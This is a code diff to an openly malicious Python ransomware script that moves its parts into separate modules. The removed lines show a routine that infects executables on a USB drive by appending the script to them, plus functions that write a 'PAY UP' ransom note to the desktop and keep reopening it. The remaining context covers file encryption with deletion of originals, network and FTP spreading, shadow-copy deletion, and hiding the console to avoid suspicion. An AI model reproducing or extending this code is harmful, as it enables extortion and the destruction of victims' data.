@@ -1,14 +1,11 @@
 #!/usr/bin/python3.8
-import getpass
-import os
-import subprocess
-import time
-from drive_propagation import *
+from time import *
+from Components.drive_propagation import *
+from Gui.gui import *
+from Components.ransom_note import *
 
 import sys
 import nmap
-import win32con
-import win32gui
 from cryptography.fernet import Fernet
 
 
@@ -52,34 +49,6 @@ def virus_property():
         break
 
 
-def usb_infection():
-    # Infect Thumb drives In F:// drive
-    target = '.exe'
-    path = 'F:\\'
-    try:
-        for r, d, files in os.walk(path):
-            for file in files:
-                if file.endswith(target):
-                    try:
-                        with open(file, 'ab+') as g:
-                            line = g.read()
-                            if status not in line:
-                                g.seek(0, 0)
-                                with open(sys.argv[0], 'rb+') as c:
-                                    line = c.read()
-                                    g.write('\n' + line)
-                                    g.close()
-                                    c.close()
-                                    os.chmod(file, 0o777)
-                            else:
-                                pass
-                    except Exception:
-                        pass
-            break
-    except Exception:
-        pass
-
-
 def find_file():
     # Get files to encrypt from current user
     path = 'C:\\'
@@ -106,50 +75,6 @@ def encrypt_file():
                 os.remove(fn)
         except Exception:
             pass
-
-
-def message():
-    # this function prompts a window containing the ransom message
-    from Gui import gui
-    gui.gui()
-
-
-def ransom_note():
-    # Create ransom note .txt
-    usr = getpass.getuser()
-    path = 'C:/Users/' + usr + '/Desktop/'
-    try:
-        with open(path + "RANSOM NOTE.txt", "w+") as file:
-            file.write(
-"""
-WE HAVE COMPROMISED YOUR COMPUTER AND ENCRYPTED YOUR FILES
-PAY UP
-"""
-            )
-    except Exception as e:
-        print(e)
-        pass
-
-
-def show_ransom_note():
-    # Open the created ransom note in notepad.exe
-    usr = getpass.getuser()
-    path = 'C:/Users/' + usr + '/Desktop/'
-    note = subprocess.Popen(['notepad.exe', path + 'RANSOM NOTE.txt'])
-    count = 0
-
-    while True:
-        time.sleep(0.1)
-        top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
-        if top_window == 'RANSOM NOTE - Notepad':
-            pass
-        else:
-            note.kill()
-            note = subprocess.Popen(['notepad.exe', path + 'RANSOM NOTE.txt'])
-        time.sleep(10)
-        count += 1
-        if count == 2:
-            break
 
 
 def ftp_spread():
@@ -195,23 +120,20 @@ def delete_ransomware():
 
 
 def main():
-    # Hides the terminal console to prevent suspicion while working in background
     # hide = win32gui.GetForegroundWindow()
     # win32gui.ShowWindow(hide, win32con.SW_HIDE)
-    time.sleep(5)
+    sleep(5)
     virus_property()
-    time.sleep(5)
-    usb_infection()
-    time.sleep(5)
+    sleep(5)
     # find_file()
     # encrypt_file()
-    message()
-    # ransom_note()
-    # show_ransom_note()
     spread()
     find_shared_file()
     encrypt_shared_file()
-    time.sleep(5)
+    gui()
+    ransom_note()
+    show_ransom_note()
+    sleep(5)
     # ftp_spread()
     # dlt_shadow_copy()
     # delete_ransomware()
